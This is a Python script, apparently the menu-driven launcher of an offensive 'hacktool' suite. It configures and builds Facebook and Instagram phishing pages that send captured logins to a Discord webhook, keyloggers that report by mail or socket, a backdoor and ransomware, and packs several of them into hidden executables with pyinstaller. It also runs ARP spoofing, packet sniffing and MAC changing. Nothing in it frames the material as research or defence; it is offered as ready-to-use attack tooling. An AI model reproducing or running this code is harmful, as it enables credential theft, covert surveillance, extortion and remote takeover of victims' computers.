from mitm import arp_posion,netscanner,packet_sniffing
from Change_mac import mac
import os
import subprocess as sb
from Listener import listener
from Keylogger import keyloggerlistener
import re


a = """
    Welcome to hacktool

1-)Phishing
2-)Arpposion
3-)Netscanner
4-)sniff
5-)Keyloger from smtp
6-)Keyloger from ip
7-)Backdoor
8-)connection console
9-)Ransomware
10-)Changemac
11-)Keylogger Listener
12-)Ransomware Decrypt
example: use 1

"""



def change_mac():
    interface = input("insert to interface:")
    input_mac = input("insert to mac:")
    mac.change_mac(interface,input_mac)


def netscan():
    ipadrr = input("input to ip addres example: 10.0.2.0/24:")
    netscanner.Scan(ipadrr)



def arp_spoof():
    target_ip = input("input target ip adress:")
    source_ip = input("input soruce ip adress:")
    arp = arp_posion.Mac()
    arp.arp_spf(target_ip,source_ip)

def Listen():
    ip = input("insert to ip address:")
    port = int(input("insert to port:"))
    listener.Listening(ip,port)

def sniff():
    iface = input("input interface:")
    sniffing = packet_sniffing.NetScan()
    sniffing.sniff(iface)

def Keyloogger_ip():
    ip = input("enter ip adress: ")
    port = input("enter port: ")
    with open("Keylogger/keyloggersocket.py","r") as file:
        a=file.read()
        a=a.replace("0.0.0.0",ip)
        a=a.replace("4444",port)
    with open("Keylogger/keyloggersocket.py","w") as file:
        file.write(a)
    sb.call(["pyinstaller","--onefile","-w","Keylogger/keyloggersocket.py"])

def Backdoor():
    ip = input("enter ip adress: ")
    port = input("enter port: ")
    with open("Bacdoor/Backdoor.py","r") as file:
        a=file.read()
        a=a.replace("0.0.0.0",ip)
        a=a.replace("4545",port)
    with open("Bacdoor/Backdoor.py","w") as file:
        file.write(a)
    sb.call(["pyinstaller","--onefile","-w","Bacdoor/Backdoor.py"])
    
def keylogger():
    mail = input("enter your mail adress: ")
    password = input("enter your mail password: ")
    with open("Keylogger/keylogger.py","r") as file:
        a = file.read()
        a=a.replace("mail",mail)
        a=a.replace("psw",password)
    with open("Keylogger/keylogger.py","w") as file:
        file.write(a)
    sb.call(["pyinstaller","--onefile","-w","Keylogger/keylogger.py"])

def Keylog_listen():
    ip = input("enter ipadress: ")
    port = input("enter port number: ")
    keyloggerlistener.listen(ip,port) 

def Ransomware():
    ip = input("enter your ip adress: ")
    port = input("enter your  pport number: ")
    with open("Ransomware/Ransomware.py","r") as file:
        a = file.read()
        a=a.replace("0.0.0.0",ip)
        a=a.replace("4444",port)
    with open("Ransomware/Ransomware.py","w") as file:
        file.write(a)
    sb.call(["pyinstaller","--onefile","-w","Ransomware/Ransomware.py"])

def Ransomware_decrypt():
    key = input("enter decrypt key: ")
    with open("Ransomware/ransom_decrypted.py","r") as file:
        a=file.read()
        a=a.replace("1122",key)
    with open("Ransomware/ransom_decrypted.py","w") as file:
        file.write(a)
    sb.call(["pyinstaller","--onefile","-w","Ransomware/ransom_decrypted.py"])

def Phishing_f():
    webhok = input("enter discord webhook: "),
    with open("Phishing/facebook/index.html","r") as file:
        a=file.read()
        a=a.replace("WEBHOOK",webhok)
    with open("Phishing/facebook/index.html","w") as file:
        file.write(a)

def Phishing_i():
    webhok = input("enter discord webhook: "),
    with open("Phishing/instagram/index.html","r") as file:
        a=file.read()
        a=a.replace("WEBHOOK",webhok)
    with open("Phishing/instagram/index.html","w") as file:
        file.write(a)

while True:
    print(a)
    user_input = input("input:")
    try:
        if  user_input == 'use 10':
            change_mac()
        elif user_input == 'use 12':
            Ransomware_decrypt()
        elif user_input == 'use 9':
            Ransomware()
            print("after send .exe extansion file open listener send commannd '1'")
        elif user_input == 'use 11':
            Keylog_listen()
        elif user_input == 'use 6':
            Keyloogger_ip()
        elif user_input == 'use 7':
            Backdoor()
        elif user_input == 'use 3':
            netscan()
        elif user_input == 'use 2':
            sb.call(["echo","1",">","/proc/sys/net/ipv4/ip_forward"])
            arp_spoof()
        elif user_input == 'use 4':
            sniff()
        elif user_input == 'use 8':
            Listen()
        elif user_input == 'use 7':
            Backdoor()
        elif user_input == 'use 5':
            keylogger()
        elif user_input == 'use 1':
            temp = input("1-)Facebook 2-)İnstagram example: use 1 enter: ")
            if temp == 'use 1':
                Phishing_f()
                print("file created move to server")
            elif temp == 'use 2':
                Phishing_i()
                print("file created move to server")
            else:
                print("ERROR!!")
        elif user_input == 'exit' or user_input == 'EXIT':
            exit()
    except AttributeError:
        print('ERROR!')
    except ValueError:
        print("ERROR!")
    except KeyboardInterrupt:
        print("Exit")